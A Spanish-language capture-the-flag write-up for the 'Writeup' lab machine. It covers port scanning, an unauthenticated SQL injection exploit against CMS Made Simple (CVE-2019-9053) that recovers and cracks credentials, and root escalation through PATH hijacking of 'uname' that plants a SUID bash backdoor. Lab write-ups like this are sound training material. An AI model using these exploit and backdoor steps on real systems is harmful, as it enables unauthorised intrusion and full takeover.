# Writeup
## Initial Scan
```
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 (RSA)
|   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)
|_  256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/writeup/
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Nothing here yet.
```
## Enum
### HTTP 
#### Robots.txt
```
#              __
#      _(\    |@@|
#     (__/\__ \--/ __
#        \___|----|  |   __
#            \ }{ /\ )_ / _\
#            /\__/\ \__O (__
#           (--/\--)    \__/
#           _)(  )(_
#          `---''---`

# Disallow access to the blog until content is finished.
User-agent: * 
Disallow: /writeup/
```
Como podemos ver hay un dir deshabilitado veamos que hay dentro

#### Writeup
Wappalyzer nos dice directamente que la página usa CMS Made Simple, hay varios CVE para este CMS pero no sabemos la version exacta asi que enumeremos mas a ver si la descubrimos
```
/administrator <- Login
```
Encontramos el endpoint de login pero ademas encontramos una pieza clave, el Copyright es 2004-2019,asi que deben estar en la version de 2019, eso acota bastante la búsqueda de exploits para el servicio
### CVE-2019-9053
Este CVE parece un buen candidato ya que concede acceso sin necesidad de autenticación previa, busquemos un script para explotar esta time based sqli
```
https://www.exploit-db.com/exploits/46635
```
Lo utilizamos 
```
python2.7 46635.py -u http://10.10.10.138 
[+] Salt for password found: 5a599ef579066807
[+] Username found: jkr
[+] Email found: jkr@writeup.htb
[+] Password found: 62def4866937f08cc13bab43bb14e6f7
[+] Password cracked: raykayjay9
```
La contraseña del CMS tambien vale para el SSH así que were in

## Privesc
Podemos ver el siguiente proceso al inciar sesion mediante el pspy32
```
2020/08/26 15:04:52 CMD: UID=0    PID=2641   | run-parts --lsbsysinit /etc/update-motd.d 
2020/08/26 15:04:52 CMD: UID=0    PID=2642   | uname -rnsom 
```
El segundo comando sale de la ejecucion de un archivo que hay /etc/update-motd.d, por otro lado podemos ver que podemos escribir en el primer elemento del PATH por parte del grupo staff
```
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```
Podemos hacer lo siguiente:
```
jkr@writeup:/usr/local/bin$ echo -e '#!/bin/bash\nchmod +s /bin/bash' > /usr/local/bin/uname 
jkr@writeup:/usr/local/bin$ chmod +x /usr/local/bin/uname
```
Nos logeamos ahora por SSH y ya tenemos nuestra backdoor con el SUID en bash

